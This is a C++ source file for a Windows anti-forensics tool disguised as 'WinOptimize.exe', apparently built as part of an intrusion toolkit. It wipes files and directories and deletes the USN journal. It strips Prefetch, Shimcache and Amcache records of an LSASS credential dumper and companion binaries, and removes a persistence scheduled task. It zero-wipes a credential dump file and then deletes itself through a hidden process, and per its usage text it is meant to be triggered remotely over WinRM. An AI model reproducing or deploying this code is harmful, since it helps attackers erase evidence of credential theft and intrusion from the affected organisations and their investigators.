#include "Cleanerup.h"


void SecureWipeFile(const std::string& filePath) {
    HANDLE hFile = CreateFileA(filePath.c_str(), GENERIC_WRITE, 0, NULL, OPEN_EXISTING,
                               FILE_FLAG_WRITE_THROUGH | FILE_FLAG_SEQUENTIAL_SCAN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return;

    LARGE_INTEGER fileSize;
    if (!GetFileSizeEx(hFile, &fileSize)) { CloseHandle(hFile); return; }

    std::vector<char> zeros(BUFFER_SIZE, 0);
    DWORD bytesWritten;
    for (LONGLONG offset = 0; offset < fileSize.QuadPart; offset += BUFFER_SIZE) {
        DWORD toWrite = (DWORD)min((LONGLONG)BUFFER_SIZE, fileSize.QuadPart - offset);
        if (!WriteFile(hFile, zeros.data(), toWrite, &bytesWritten, NULL)) {
            CloseHandle(hFile); return;
        }
        FlushFileBuffers(hFile);
    }
    FlushFileBuffers(hFile);
    CloseHandle(hFile);
    DeleteFileA(filePath.c_str());
}


void SecureWipeDirectory(const std::string& dirPath) {
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((dirPath + "\\*").c_str(), &findData);
    if (hFind == INVALID_HANDLE_VALUE) { FindClose(hFind); return; }
    do {
        std::string name = findData.cFileName;
        if (name == "." || name == "..") continue;
        std::string fullPath = dirPath + "\\" + name;
        if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) SecureWipeDirectory(fullPath);
        else SecureWipeFile(fullPath);
    } while (FindNextFileA(hFind, &findData));
    FindClose(hFind);
    RemoveDirectoryA(dirPath.c_str());
}


void ClearUsnJournal() {
    HANDLE hVol = CreateFileW(L"\\\\.\\C:", GENERIC_READ | GENERIC_WRITE,
                              FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
    if (hVol == INVALID_HANDLE_VALUE) return;

    USN_JOURNAL_DATA_V0 ujd = {};
    DWORD br;
    if (!DeviceIoControl(hVol, FSCTL_QUERY_USN_JOURNAL, NULL, 0, &ujd, sizeof(ujd), &br, NULL)) {
        CloseHandle(hVol); return;
    }

    DELETE_USN_JOURNAL_DATA dujd = { ujd.UsnJournalID, USN_DELETE_FLAG_DELETE | USN_DELETE_FLAG_NOTIFY };
    DeviceIoControl(hVol, FSCTL_DELETE_USN_JOURNAL, &dujd, sizeof(dujd), NULL, 0, &br, NULL);

    CREATE_USN_JOURNAL_DATA cujd = { ujd.MaximumSize, ujd.AllocationDelta };
    DeviceIoControl(hVol, FSCTL_CREATE_USN_JOURNAL, &cujd, sizeof(cujd), NULL, 0, &br, NULL);

    CloseHandle(hVol);
}


void DisplaceMftRecords() {
    char path[MAX_PATH];
    std::vector<std::string> files;
    DWORD tick = GetTickCount();
    for (int i = 0; i < 100; i++) {
        snprintf(path, MAX_PATH, "C:\\Windows\\Temp\\~%08X%04X.tmp", tick, i);
        HANDLE h = CreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_NORMAL, NULL);
        if (h != INVALID_HANDLE_VALUE) { CloseHandle(h); files.push_back(path); }
    }
    for (const auto& f : files) DeleteFileA(f.c_str());
}


void DeletePrefetchEntries(const char* names[], int count) {
    for (int i = 0; i < count; i++) {
        std::string pattern = std::string(PREFETCH_DIR) + names[i] + "*.pf";
        WIN32_FIND_DATAA fd;
        HANDLE h = FindFirstFileA(pattern.c_str(), &fd);
        if (h == INVALID_HANDLE_VALUE) continue;
        do { SecureWipeFile(std::string(PREFETCH_DIR) + fd.cFileName); } while (FindNextFileA(h, &fd));
        FindClose(h);
    }
}


void RemoveShimcacheEntries(const wchar_t* names[], int count) {
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, SHIMCACHE_REG_KEY, 0, KEY_READ | KEY_WRITE, &hKey) != ERROR_SUCCESS)
        return;

    DWORD dataSize = 0;
    RegQueryValueExA(hKey, SHIMCACHE_REG_VAL, NULL, NULL, NULL, &dataSize);
    if (dataSize < 128) { RegCloseKey(hKey); return; }

    std::vector<BYTE> data(dataSize);
    if (RegQueryValueExA(hKey, SHIMCACHE_REG_VAL, NULL, NULL, data.data(), &dataSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey); return;
    }
    if (*(DWORD*)data.data() != SHIMCACHE_MAGIC) { RegCloseKey(hKey); return; }

    std::vector<BYTE> filtered(data.begin(), data.begin() + 128);
    DWORD entryCount = 0;
    size_t offset = 128;

    while (offset + 12 <= (size_t)dataSize) {
        if (*(DWORD*)(data.data() + offset) != SHIMCACHE_MAGIC) break;
        DWORD entryDataSize = *(DWORD*)(data.data() + offset + 8);
        size_t entryEnd = offset + 12 + entryDataSize;
        if (entryEnd > (size_t)dataSize) break;

        bool remove = false;
        if (entryDataSize >= 2) {
            WORD pathLen = *(WORD*)(data.data() + offset + 12);
            if ((DWORD)(2 + pathLen) <= entryDataSize && pathLen > 0) {
                std::wstring path((WCHAR*)(data.data() + offset + 14), pathLen / sizeof(WCHAR));
                std::transform(path.begin(), path.end(), path.begin(), ::towupper);
                for (int i = 0; i < count; i++) {
                    std::wstring name(names[i]);
                    std::transform(name.begin(), name.end(), name.begin(), ::towupper);
                    if (path.find(name) != std::wstring::npos) { remove = true; break; }
                }
            }
        }

        if (!remove) {
            filtered.insert(filtered.end(), data.begin() + offset, data.begin() + entryEnd);
            entryCount++;
        }
        offset = entryEnd;
    }

    *(DWORD*)(filtered.data() + 4) = entryCount;
    RegSetValueExA(hKey, SHIMCACHE_REG_VAL, 0, REG_BINARY, filtered.data(), (DWORD)filtered.size());
    RegCloseKey(hKey);
}


static void EnablePrivilege(LPCWSTR name) {
    HANDLE hToken;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &hToken)) return;
    TOKEN_PRIVILEGES tp = { 1 };
    LookupPrivilegeValueW(NULL, name, &tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    CloseHandle(hToken);
}


void RemoveAmcacheEntries(const char* names[], int count) {
    EnablePrivilege(SE_RESTORE_NAME);
    EnablePrivilege(SE_BACKUP_NAME);

    if (RegLoadKeyA(HKEY_LOCAL_MACHINE, AMCACHE_TEMP_KEY, AMCACHE_HVE) != ERROR_SUCCESS) return;

    std::string rootPath = std::string(AMCACHE_TEMP_KEY) + "\\" + AMCACHE_ROOT;
    HKEY hRoot;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, rootPath.c_str(), 0, KEY_ALL_ACCESS, &hRoot) == ERROR_SUCCESS) {
        std::vector<std::string> toDelete;
        char subkey[256];
        DWORD idx = 0, len;
        while (len = sizeof(subkey), RegEnumKeyExA(hRoot, idx++, subkey, &len, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
            HKEY hEntry;
            if (RegOpenKeyExA(hRoot, subkey, 0, KEY_READ, &hEntry) != ERROR_SUCCESS) continue;
            char val[MAX_PATH * 2]; DWORD valSize = sizeof(val);
            if (RegQueryValueExA(hEntry, AMCACHE_PATH_VALUE, NULL, NULL, (BYTE*)val, &valSize) == ERROR_SUCCESS) {
                std::string path(val);
                std::transform(path.begin(), path.end(), path.begin(), ::toupper);
                for (int i = 0; i < count; i++) {
                    std::string upper(names[i]);
                    std::transform(upper.begin(), upper.end(), upper.begin(), ::toupper);
                    if (path.find(upper) != std::string::npos) { toDelete.push_back(subkey); break; }
                }
            }
            RegCloseKey(hEntry);
        }
        for (const auto& k : toDelete) RegDeleteTreeA(hRoot, k.c_str());
        RegCloseKey(hRoot);
    }

    RegUnLoadKeyA(HKEY_LOCAL_MACHINE, AMCACHE_TEMP_KEY);
}


void PrintUsage() {
    printf(
        "WinOptimize.exe - Remote forensic artifact cleanup\n\n"
        "Usage:\n"
        "  WinOptimize.exe           Run cleanup (no arguments required)\n"
        "  WinOptimize.exe --help    Show this help\n\n"
        "What it cleans:\n"
        "  - Prefetch files        (SysAnalyzer, DiagHost, WinOptimize)\n"
        "  - Shimcache entries     (AppCompatCache registry blob, Win10/11)\n"
        "  - Amcache entries       (Amcache.hve hive)\n"
        "  - USN Journal           (deleted and recreated)\n"
        "  - Freed MFT records     (100-file displacement)\n"
        "  - Scheduled task file   (C:\\Windows\\System32\\Tasks\\SysHealthCheck, zeroed)\n"
        "  - Scheduled task        (SysHealthCheck)\n"
        "  - Dump file             (path read from C:\\ProgramData\\WinDiag\\status.log, zeroed)\n"
        "  - C:\\ProgramData\\WinDiag\\  (all files zeroed before deletion)\n\n"
        "Note:\n"
        "  Requires admin privileges. Intended to be deployed and triggered\n"
        "  remotely by winRlZZaZ via WinRM. Self-deletes on exit.\n"
    );
}


int main(int argc, char* argv[]) {
    if (argc > 1) {
        PrintUsage();
        return 0;
    }
    ClearUsnJournal();

    const char* prefetchNames[] = { BIN_BUSINESSANALYZER, BIN_LSASS_DUMPER, BIN_SELF };
    DeletePrefetchEntries(prefetchNames, 3);

    const wchar_t* shimNames[] = { BIN_BUSINESSANALYZER_W, BIN_LSASS_DUMPER_W, BIN_SELF_W };
    RemoveShimcacheEntries(shimNames, 3);

    const char* amcacheNames[] = { "SysAnalyzer", "DiagHost", "WinOptimize" };
    RemoveAmcacheEntries(amcacheNames, 3);

    // Wipe task file before schtasks delete (schtasks /delete only removes, doesn't zero)
    SecureWipeFile(TASK_FILE);
    system("schtasks /delete /tn \"SysHealthCheck\" /f >nul 2>&1");

    // Wipe dump file
    std::ifstream tempoFile(TEMPO_FILE);
    if (tempoFile.is_open()) {
        std::string dumpPath;
        std::getline(tempoFile, dumpPath);
        tempoFile.close();
        dumpPath.erase(dumpPath.find_last_not_of(" \r\n\t") + 1);
        if (!dumpPath.empty())
            SecureWipeFile(dumpPath);
    }

    SecureWipeDirectory(TEMP_DIR);
    DisplaceMftRecords();

    // Self-delete
    char selfPath[MAX_PATH];
    GetModuleFileNameA(NULL, selfPath, MAX_PATH);
    char cmd[MAX_PATH + 64];
    snprintf(cmd, sizeof(cmd), "cmd /c choice /d y /t 1 >nul & del /f /q \"%s\"", selfPath);
    STARTUPINFOA si = { sizeof(si) };
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    PROCESS_INFORMATION pi = {};
    CreateProcessA(NULL, cmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
}
